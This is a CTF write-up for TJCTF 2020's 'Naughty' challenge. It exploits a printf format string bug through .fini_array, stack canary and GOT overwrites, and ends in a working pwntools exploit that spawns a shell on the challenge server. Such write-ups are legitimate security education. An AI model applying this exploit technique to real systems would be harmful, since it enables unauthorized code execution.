# Naughty Writeup

Naughty was the final pwn in TJCTF 2020. It was an interesting and nice format
string pwn problem. Let us begin by reversing it:  
```c  
int __cdecl main(int argc, const char **argv, const char **envp)  
{  
 char s; // [esp+0h] [ebp-10Ch]  
 unsigned int v5; // [esp+100h] [ebp-Ch]  
 int *v6; // [esp+104h] [ebp-8h]

 v6 = &arg;;  
 v5 = __readgsdword(0x14u);  
 puts(  
   "  _  _                     __ _   _        _       _  _
_  _      _                      ___   ");  
 puts(  
   " | \\| |   __ _    _  _    / _` | | |_     | |_    | || |    o O O   ___      _ _     o O O | \\| |    (_)     __   "  
   "   ___    |__ \\  ");  
 puts(  
   " | .` |  / _` |  | +| |   \\__, | | ' \\    |  _|    \\_, |   o       / _ \\    | '_|   o      | .` |    | |    / _|"  
   "    / -_)     /_/  ");  
 puts(  
   " |_|\\_|  \\__,_|   \\_,_|   |___/  |_||_|   _\\__|   _|__/   TS__[O]
\\___/   _|_|_   TS__[O] |_|\\_|   _|_|_   \\"  
   "__|_   \\___|   _(_)_  ");  
 puts(  
"_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|
\"\"\"\"| {======|_|\"\"\"\"\"|_|\""  
   "\"\"\"\"|
{======|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"| ");  
 puts(  
   "\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'./o--
000'\"`-0-0-'\"`-0-0-'./o--000'\"`-0-0-'\"`-0-0-"  
   "'\"`-0-0-'\"`-0-0-'\"`-0-0-' ");  
 puts("What is your name?");  
 fflush(stdout);  
 fgets(&s, 256, stdin);  
 printf("You are on the NAUGHTY LIST ");  
 printf(&s);  
 return 0;  
}  
```

As you can see, there is a clear format string bug in the last printf call.
Taking a look at checksec:  
```  
   Arch:     i386-32-little  
   RELRO:    No RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x8048000)  
```  
We can just do GOT overwrite to overwrite printf and gain code execution.
However, the only issue is that nothing is called after printf; the program
just finishes then. However, I did note the canary part of this, which can
trigger another function known as `__stack_chk_fail` when the canary check
fails. I also knew about the .fini section, which has its contents triggered
during normal process termination. This part as well as .init are handled by
the runtime linker.

To overwrite the canary, we will first need a stack leak, which is not
possible at this stage (without causing the program to just terminate). Since
their binary does not have PIE enabled, I decided to target the .fini section.
At this point, I also found another similar writeup:
https://wumb0.in/mmactf-2016-greeting.html related to overwriting contents of
`.fini_array`. Just like that problem, I overwrote
`__do_global_dtors_aux_fini_array_entry` in that section with `main`. This
way, the program will then go back to main during the "termination" phase. The
offset for the overwrites can be determined with the standard format string
technique of sending in `ABCD %p %p %p...` and seeing where that first value
reappears. The offsets for leaking libc and stack can be determined with the
following basic script, from which I just dumped the output and took a quick
look at possible libc and stack address values:  
```py  
from pwn import *

for i in range(500):  
	p = process('./naughty')  
	p.recvuntil('name?\n')  
	p.sendline("%" + str(i) + "$p")  
	print "index: " + str(i)  
	print p.recvall()  
```

Now, when we go back to main, we cannot just overwrite printf GOT with system
and then expect main to return. Since .init and .fini are handled by the
runtime linker, and all we did was make it call main upon termination, the
correct setup to trigger the .fini section again is not done and the program
will just end after the second call to main finishes; we need to find another
way to redirect back to main. I decided to target the canary now. With the
stack leak, I can determine the offset to the canary. I overwrite that with a
random value to trigger the canary failure function, which I also overwrote
with main in the same format string. I also overwrote printf with system
(whose address is determined from the libc leak) in the same payload at this
point. Afterwards, it should loop back to main again. Now printf is system, so
simply typing /bin/sh should pop shells.

A note about libc. The address I leaked is `_IO_2_1_stdin_`. Since my system
libc is different from the docker libc, I needed to figure out the remote libc
with libc database. But I also noticed that in the previous dockers on this
CTF, most if not all the libcs were the same, so I just made an assumption
about the libc which turned out to be correct. Note that the stack setup ended
up turning out different from my local and remote version, so I just
patchelf'd the file with the correct libc and linker and re-debugged there.
Here is my final exploit:  
```py  
from pwn import *

context(arch='i386')  
bin = ELF('./naughty')  
libc = ELF('libc-2.27.so')  
p = remote('p1.tjctf.org', 8004)

p.recvuntil('name?\n')  
write1 = {0x08049bac:bin.symbols['main']}  
payload = fmtstr_payload(7, write1) + "pepega %2$p poggers %81$p" #pepega is
my marker for libc, poggers is my marker for stack  
print payload  
p.sendline(payload)  
p.recvuntil('pepega ')  
leak = int(p.recv(10), 16)  
libc.address = leak - libc.symbols['_IO_2_1_stdin_']  
log.info("Leak: " + hex(leak))  
log.info("Base: " + hex(libc.address))

p.recvuntil('poggers ')  
canary = int(p.recv(10), 16) - 408 #offset from this stack leak to canary  
log.info("Canary address: " + hex(canary))

write2 = {canary:0xdeadbeef, bin.got['__stack_chk_fail']:bin.symbols['main'],
bin.got['printf']:libc.symbols['system']}  
payload = fmtstr_payload(7, write2)  
p.recvuntil('name?\n')  
p.sendline(payload)  
p.recvuntil('name?\n')  
p.sendline("/bin/sh")  
p.interactive()

```  
Fun challenge overall!  

Original writeup
(https://github.com/BirdsArentRealCTF/Writeups/tree/master/tjctf2020/naughty).